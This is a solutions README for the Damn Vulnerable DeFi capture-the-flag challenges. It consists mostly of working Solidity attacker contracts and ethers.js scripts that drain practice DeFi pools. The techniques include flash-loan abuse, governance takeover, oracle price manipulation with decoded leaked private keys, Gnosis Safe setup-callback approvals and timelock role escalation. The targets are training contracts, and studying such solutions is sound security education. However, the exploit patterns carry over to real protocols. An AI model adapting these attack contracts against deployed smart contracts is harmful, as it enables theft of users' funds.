# damnvulnerabledefi

Foundry edition
https://github.com/StErMi/forge-damn-vulnerable-defi





## solution:

### unstoppable

```javascript
        await this.token.connect(attacker).transfer(this.pool.address, 1);
```

### naive-receiver

```javascript
        for (let i = 0; i < 10; i++) {
            await this.pool.flashLoan(this.receiver.address, 2);
        }
```

### truster

```javascript
        let abi = [
            "function approve(address spender, uint256 amount) returns (bool)"
        ];
        let iface = new ethers.utils.Interface(abi);
        let func_data = iface.encodeFunctionData("approve", [
            attacker.address, TOKENS_IN_POOL
        ]);
        await this.pool.flashLoan(0, attacker.address, this.token.address, func_data);

        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
```

### side-entrance

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface sidePool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract attack04 {
    address private pool;
    address private owner;
    constructor (address _pool) payable {
        pool = _pool;
        owner = msg.sender;
    }

    function execute() public payable {
        sidePool(pool).deposit{value: msg.value}();
    }

    function attack_dr(uint256 _amount) public {
        sidePool(pool).flashLoan(_amount);
    }

    function pull() public {
        sidePool(pool).withdraw();
        selfdestruct(payable(owner));
    }

    receive() external payable {}
}
```


```javascript
        const attackFactory = await ethers.getContractFactory('attack04', attacker);
        this.attack = await attackFactory.deploy(this.pool.address);
        await this.attack.attack_dr(ETHER_IN_POOL);
        await this.attack.pull();
```


### the-rewarder

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface flashPool {
    function flashLoan(uint256 amount) external;
}

interface rewardPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}

interface Token {
    function balanceOf(address addr) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address addr, uint256 amt) external;
}

contract attack05 {
    address private flash_pool;
    address private reward_pool;
    address private liquidity_token;
    address private reward_token;
    address private owner;
    constructor (address _flashpool, address _rewardpool, address _liuidityToken, address _rewardtoken) {
        flash_pool = _flashpool;
        reward_pool = _rewardpool;
        liquidity_token = _liuidityToken;
        reward_token = _rewardtoken;
        owner = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) external {
        Token(liquidity_token).approve(reward_pool, amount);
        rewardPool(reward_pool).deposit(amount);
        rewardPool(reward_pool).distributeRewards();
        rewardPool(reward_pool).withdraw(amount);
        Token(liquidity_token).transfer(flash_pool, amount);
        uint _amount = Token(reward_token).balanceOf(address(this));
        Token(reward_token).transfer(owner, _amount);
    }

    function attack_dr(uint256 _amount) external {
        flashPool(flash_pool).flashLoan(_amount);
    }

}
```


```javascript
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
        const attackFactory = await ethers.getContractFactory('attack05', attacker);
        this.attack = await attackFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address, this.liquidityToken.address, this.rewardToken.address);
        await this.liquidityToken.connect(attacker).approve(this.rewarderPool.address, TOKENS_IN_LENDER_POOL);
        await this.attack.attack_dr(TOKENS_IN_LENDER_POOL);
```

### selfie

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface flashPool {
    function flashLoan(uint256 amount) external;
}

interface governance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface ERC20 {
    function transfer(address addr, uint256 amt) external;
    function snapshot() external returns (uint256);

}

contract attack06 {
    address private flash_pool;
    address private gov;
    address private owner;
    uint private exe_id;
    constructor (address _flashpool, address _gov) {
        flash_pool = _flashpool;
        gov = _gov;
        owner = msg.sender;
    }

    function receiveTokens(address _token, uint256 amount) external {

        ERC20(_token).snapshot();

        bytes memory data = bytes(abi.encodeWithSignature("drainAllFunds(address)", owner));
        exe_id = governance(gov).queueAction(flash_pool, data, 0);

        ERC20(_token).transfer(msg.sender, amount);

    }

    function attack_dr(uint256 _amount) external {
        flashPool(flash_pool).flashLoan(_amount);
    }

    function execute_gov() external {
        governance(gov).executeAction(exe_id);
    }

}
```

```javascript
        const attackFactory = await ethers.getContractFactory('attack06', attacker);
        this.attack = await attackFactory.deploy(this.pool.address, this.governance.address);

        await this.attack.attack_dr(TOKENS_IN_POOL);

        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);

        await this.attack.execute_gov();
```


### Compromised


4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535

4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134

First convert to ASCII
MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5

MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4

base64 decode to get the private key
0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48

corresponding to the later 2 address.

```javascript
        const key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        const key2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
        const oracle1 = new ethers.Wallet(key1, ethers.provider);
        const oracle2 = new ethers.Wallet(key2, ethers.provider);

        await this.oracle.connect(oracle1).postPrice("DVNFT", 1);
        await this.oracle.connect(oracle2).postPrice("DVNFT", 1);

        await this.exchange.connect(attacker).buyOne({value: 1});

        const bal = await ethers.provider.getBalance(this.exchange.address);

        await this.oracle.connect(oracle1).postPrice("DVNFT", bal);
        await this.oracle.connect(oracle2).postPrice("DVNFT", bal);

        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
        await this.exchange.connect(attacker).sellOne(0);
        
        await this.oracle.connect(oracle1).postPrice("DVNFT", INITIAL_NFT_PRICE);
        await this.oracle.connect(oracle2).postPrice("DVNFT", INITIAL_NFT_PRICE);
```

### puppet

```javascript
        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);

        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, (await ethers.provider.getBlock('latest')).timestamp * 2);
        
        let uni_balance = await this.token.balanceOf(this.uniswapExchange.address);
        let token_amt = uni_balance.sub(UNISWAP_INITIAL_TOKEN_RESERVE);

        let depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: depositRequired});

        let attacker_eth = await ethers.provider.getBalance(attacker.address);

        await this.uniswapExchange.connect(attacker).ethToTokenSwapOutput(token_amt, (await ethers.provider.getBlock('latest')).timestamp * 2, {value: attacker_eth.mul(8).div(10)});
```

### puppet-v2

Same as last one.

```javascript
        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);

        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 1, [this.token.address, this.weth.address], attacker.address, (await ethers.provider.getBlock('latest')).timestamp * 2);

        let depositOfWETHRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        
        await this.weth.connect(attacker).deposit({value: depositOfWETHRequired});
        await this.weth.connect(attacker).approve(this.lendingPool.address, depositOfWETHRequired);
        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);

        attacker_eth = await ethers.provider.getBalance(attacker.address);

        await this.uniswapRouter.connect(attacker).swapExactETHForTokens(1, [this.weth.address, this.token.address], attacker.address, (await ethers.provider.getBlock('latest')).timestamp * 2, {value: attacker_eth.sub(1e15)});
```

### Free Rider

```solidity
interface UniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IWETH9 {
    function withdraw(uint amount0) external;
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
    function balanceOf(address addr) external returns (uint);
}

contract FreeRiderAttacker is IUniswapV2Callee {

    UniswapV2Pair private uniswapPair;
    FreeRiderNFTMarketplace private marketPlace;
    IWETH9 private weth;
    ERC721 public nft;
    FreeRiderBuyer public buyer;
    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(address _uniswapPairAddress,
        address payable _marketPlace,
        address _wethAddress,
        address _nftAddress,
        address _buyer
    ) {
        uniswapPair = UniswapV2Pair(_uniswapPairAddress);
        marketPlace = FreeRiderNFTMarketplace(_marketPlace);
        weth = IWETH9(_wethAddress);
        nft = ERC721(_nftAddress);
        buyer = FreeRiderBuyer(_buyer);
    }

    function attack(uint256 amount) external payable{
        uniswapPair.swap(amount, 0, address(this), new bytes(1));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        weth.withdraw(amount0);

        marketPlace.buyMany{value: address(this).balance}(tokenIds);

        weth.deposit{value: address(this).balance}();

        weth.transfer(address(uniswapPair), weth.balanceOf(address(this)));

        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), address(buyer), i);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    )
    external
    returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
```


### Backdoor

```solidity
contract BackdoorAttacker {
    IERC20 private immutable token;

    constructor(address _tokenAddress) {
        token = IERC20(_tokenAddress);
    }

    function attack(
        address _walletFactoryAddress,
        address _masterCopyAddress,
        address _walletRegistryAddress,
        address[] calldata _owners
    ) external {
        for (uint256 i = 0; i < 4; i++) {
            address[] memory owners = new address[](1);
            owners[0] = _owners[i];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                address(this),
                abi.encodeWithSelector(BackdoorAttacker.approve.selector, address(this)),
                address(0x0),
                address(0x0),
                0,
                address(0x0)
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(_walletFactoryAddress).createProxyWithCallback(
                _masterCopyAddress,
                initializer,
                i,
                IProxyCreationCallback(_walletRegistryAddress)
            );

            token.transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }

    function approve(address spender) external {
        token.approve(spender, type(uint256).max);
    }
}
```



### Climber

```solidity
interface IClimberTimelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract ClimberAttacker {
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;
    IClimberTimelock private timelock;
    address private vault;
    address private attacker;

    constructor (address _timelock, address _vault, address _attacker) {
        timelock = IClimberTimelock(_timelock);
        vault = _vault;
        attacker = _attacker;
    }

    function attack() external {

        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));


        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));

        targets.push(address(vault));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", attacker));

        dataElements.push(abi.encodeWithSignature("schedule()"));
        values.push(0);
        targets.push(address(this));

        salt = keccak256("SALT");

        timelock.execute(targets, values, dataElements, salt);
    }

    function schedule() public{
        timelock.schedule(targets, values, dataElements, salt);
    }
}
```




